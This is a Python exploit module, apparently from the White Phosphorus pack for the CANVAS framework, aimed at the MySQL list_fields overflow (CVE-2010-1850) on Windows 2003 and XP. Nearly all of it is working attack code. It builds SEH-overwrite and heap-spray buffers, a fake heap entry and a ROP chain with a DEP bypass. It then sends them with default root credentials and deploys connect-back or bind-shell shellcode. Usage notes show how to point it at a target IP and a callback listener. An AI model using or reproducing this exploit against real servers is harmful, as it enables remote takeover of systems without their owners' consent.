
#! /usr/bin/env python
######################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
######################################################################################


#Standard Imports
import sys 
sys.path.append(".")
sys.path.append("./libs")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import sys
import time
from struct import *

# CANVAS modules
from wp_exploit import *
from wp_dialog import *
from wp_osversions import *
import canvasengine
from MOSDEF import mosdef 
from MOSDEF.mosdefutils import *
from MOSDEFShellServer import MosdefShellServer
import mysqllib

######################################################################################
NAME = "MySQL List Fields Remote Overflow"
DESCRIPTION = "Exploits the list_fields remote stack overflow in MySQL through a heap overrun"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']='MySQL'
DOCUMENTATION["Date public"] = "2010-04-28"
DOCUMENTATION["Repeatability"] = ""
DOCUMENTATION['CVE'] = "CVE-2010-1850"
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-1850'
DOCUMENTATION['CVSS'] = '6.0'
DOCUMENTATION["References"] = "http://bugs.mysql.com/bug.php?id=53237"
DOCUMENTATION["Notes"] = "Exploit works against MySQL 5.1.46 Developer Install, set with defaults"


# Targets
PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2003", "XP"] 

NOTES="""
WP> White Phosphorus Exploit Pack
---------------------------------------------------------------
Usage:
-T (check if target is vulnerable)
-v <version to target>
-t <target ip>   -p <target port>
-l <callback ip> -d <callback port>

Payload Options:
-O payload:<#>   (will use default if not specified)
-O command:<cmd> (for Execute Command payload)
-O bind:<port>   (for Bind MOSDEF Shell)

Versions: # WP_EDIT
0: Autoversioning
1: Windows 2003 SP1-SP2
2: Windows XP SP2-SP3

Payloads:
0: TCP Connect Back
1: IE Inject Connect Back
2: HTTPMOSDEF SSL
3: HTTPMOSDEF PLAIN
4: Bind MOSDEF Shell
5: Execute Command
6: Socket Reuse

Example:
./commandlineInterface.py -p 5555 -v 1 -i fromcreatethread
./3rdparty/White_Phosphorus/exploits/wp_example_exploit/wp_example_exploit.py  -v 0 -t 10.1.1.10 -l 10.1.1.1 -d 5555 -v 0 -O payload:0
"""

PORT = 3306
######################################################################################

# Dialog Hooks
def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return

targets = {
    0 : ["Autoversioning", (0x00000000, 0x00000000, 0x0000), []],
    1 : ["Windows 2003 SP1-SP2", (0x00000000, 0x00000000, 0x0000), [WIN2K3SP1, WIN2K3SP2]],
    2 : ["Windows XP SP2-SP3", (0x00000000, 0x00000000, 0x0000), [WINXPSP2, WINXPSP3]]
}

class theexploit(wp_exploit):
            ######################################################################################
            ## WP> Dialog Information
            ##########################s############################################################
    PAYLOADS=["TCP Connect Back",
              "IE Inject Connect Back",
              "HTTPMOSDEF SSL",
              "HTTPMOSDEF PLAIN",
              "Bind MOSDEF Shell",
              "Execute Command"]

    DEFAULT_PAYLOAD = 0

    def __init__(self):
        tcpexploit.__init__(self)
        self.host = "127.0.0.1"
        self.port = PORT
        self.targets = targets
        self.version = 0
        self.badstring = "\x00\x09\x0a\x0d\x20"
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.autoVersioned = False
        self.createThread= False    # we don't want to allow our thread to end
        
        self.user = "root"
        self.password = "root"
        return

    def usage(self):
        self.wp_usage(targets,"-U <user>\t -P <password>")
        return  
    
    def test(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))

        return

    def neededListenerTypes(self):
        self.getArgs()
        return self.wp_createWin32Listener()

    def createShellcode(self):
        self.getArgs()

        if self.version == 0:
            return 0

        self.log('WP> Targeting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode()    

    def getArgs(self):
        # Selected shell options
        self.wp_getShellcodeType()

        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        
        self.user=self.argsDict.get('user',self.user)
        self.password=self.argsDict.get('password',self.password)        
        
        # Autoversioning OS/target detection
        if self.version == 0 and not self.autoVersioned:
            self.version = self.wp_autoVersionTarget(targets)
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return
    
    def makesploit(self):

	# Control SEH
        #payload = "A"*3095 + "B"*4 + "C"*4 + "D"*1000 +"\r\n\r\n"
        #payload = "A"*3095 + "B"*4 + "C"*4 + "D" * 200 + "\x00" + "E"*100000 +"\r\n\r\n"
        #payload = "A"*1958 + "B"*4 + "C"*4 + "D" * 4 + "E" * 1337 + "\x00" + "F"*50000 + "G"*50000 +"\r\n\r\n"
        
        HEAPADDR = pack('<L', 0x1AD0D0D)
                
        SEH = "\xe2\x8e\xb4\x2a\x5f" # MAGIK !seh handler
                
        #payload = "A"*3093 + "BBBB" + SEH + "C" * 132 + "\x58\x58\x58\x58" + "\x00" + "D" * 10000
            #"D" * 1000 Eventually gets a size of 5000 / Gives us the 003e0000 overwrite
            #"D" * 10000 Eventually gets a size of 2000
            #Wonder if we can reduce this ?
        payload = "A"*3093 + "BBBB" + SEH + "C" * 84
        
        #03310000  01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01  
        #03310010  11 11 11 11 22 22 22 22 33 33 33 33 44 44 44 44 0x22222222 = LargestUnCommittedRange
        #03310020  40 01 31 03 66 66 66 66 77 77 77 77 88 88 88 88 0x77777777 = Our Segment Size 
        #03310030  30 01 31 03 0a 0a 0a 0a ?? ?? ?? ?? 0c 0c 0c 0c 
        payload += "\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"
        payload += "\x20\x01\x31\x03\x22\x22\x22\x22\x33\x33\x33\x33\x44\x44\x44\x44"
        payload += "\x40\x01\x31\x03\x66\x66\x66\x66\x77\x77\x77\x77\x88\x88\x88\x88"
        payload += "\x30\x01\x31\x03\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01" 
        
        payload += "\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01"
        
        
        payload += "\x00" + "X" * 90000        # This is what we want 
        
        
        # if self.version == 1:n
        #    payload += self.wp_UniversalDEPBypassWin2k3_VP(len(self.shellcode)+8) 
        # elif self.version == 2:
        #    payload += pack('<L', 0xbadac0de)
        # payload += self.shellcode
    
        return payload

    def run(self):
        self.getArgs()

        if self.version == 0:
            self.log("WP> Autoversioning failed.")
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return 0

        payload = self.makesploit()
        m = mysqllib.MySQL()
        
        self.result_error = 0
        
    	self.log("WP> Connecting to MySQL Server")
    	try:
    	    m.connect((self.host, self.port))      
    	except:
                self.log("WP> Attack failed - unable to connect, service died?")
                self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
                return 0 
    	try:
    	    m.authenticate(self.user, self.password)
    	except:
                self.log("WP> Attack failed - unable to authenticate, service died?")
                self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
                return 0 
                    	
    	m.simple_command(2, "mysql")
    	
    	# Must Set utf8
    	m.simple_command(3, "SET NAMES 'utf8';")
    	   	
    	payload2 = "A" * 228
    	
    	#       _HEAP_UNCOMMMTTED_RANGE
        #03310030 => 03310130  00 00 00 00  01 01 01 01 02 02 02 02 44 44 44 44  
        #                                      ^ location     ^ Size
    	#payload2 += "\x00\x00\x00\x00\x01\x01\x01\x01\x02\x02\x02\x02\x44\x44\x44\x44"
    	#037F7FFF (Stack)
    	#payload2 += "\x00\x00\x00\x00\x00\x80\x7f\x03\x02\x02\x02\x02\x44\x44\x44\x44"
    	#01ACBA90 (Heap) 0x01acb000
    	payload2 += "\x00\x00\x00\x00\x90\xBA\xAC\x01\x02\x02\x02\x02\x44\x44\x44\x44"
    	
    	#FAKE ENTRY   FirstEntry _HEAP_ENTRY
        #03310020 => 03310140   00 00 44 44 44 11 44 03 44 44 44 44 44 44 44 44 
        #                     Fake size        ^ Flag  \ Segment
        payload2 += "\x00\x00\x44\x44\x44\x11\x44\x03\x44\x44\x44\x44\x44\x44\x44\x44" 
        
        payload2 += "D" * 16
        #03310040  Needs some nops
        payload2 += "\x00\x00\x00\x00\x00\x00\x00\x00"
        #payload2 += "D" * 95000      # Between 80 and 90 to init the new segment


# attack starts here
#006883CA   3978 04          CMP DWORD PTR DS:[EAX+4],EDI


        
        # Build the frame


#00446914   8B06             MOV EAX,DWORD PTR DS:[ESI]        
#00446916   8B50 04          MOV EDX,DWORD PTR DS:[EAX+4]      
#00446919   57               PUSH EDI
#0044691A   53               PUSH EBX
#0044691B   55               PUSH EBP
#0044691C   51               PUSH ECX
#0044691D   8BCE             MOV ECX,ESI
#0044691F   FFD2             CALL EDX
                
                
                
        RETADDR = pack('<L', 0x01Ad0020)
        payload3 = RETADDR  * 1019     # 4076 bytes
                
        RETADDR = pack('<L', 0x01Ad0000)                             
        payload3 += RETADDR  * 4022     # 20180 bytes
        
        # 0x01Ad0000
        payload3 += "\x00" * 32
        
        #0x01Ad0020
        # point to our return @0x01Ad0024
        payload3 += pack('<L', 0x01Ad0024) 
        
        # pop ecx, ret
        payload3 += pack('<L', 0x00401054) 
        
        #0x01Ad0024  Push Eax, pop esp, retn
        payload3 += pack('<L', 0x00424983) 
        
        payload3 += self.wp_UniversalDEPBypassWin2k3_VP(len(self.shellcode)+8) 
        #payload3 += "\xCC"*4
        payload3 += self.shellcode
        
        payload2 += payload3 + "E" * (95000 - len(payload3))      # Between 80 and 90 to init the new segment
    	
    	# select ends up in heap @03310050
    	m.simple_command(3, "SELECT '"+payload2 +"';")     	   
        
        self.log("WP> Sending Exploit")
    	m.simple_command(4, payload, 1)
    	
        time.sleep(3)
        
        # Check if follow up is required for some shellcodes
        if self.result_error==0:
            ret = self.wp_postExploitShellcode()
            if ret:
                return ret

        ret=self.ISucceeded()
        self.setInfo("WP> %s attacking %s:%d - completed"%(NAME,self.host,self.port))
        return ret

if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
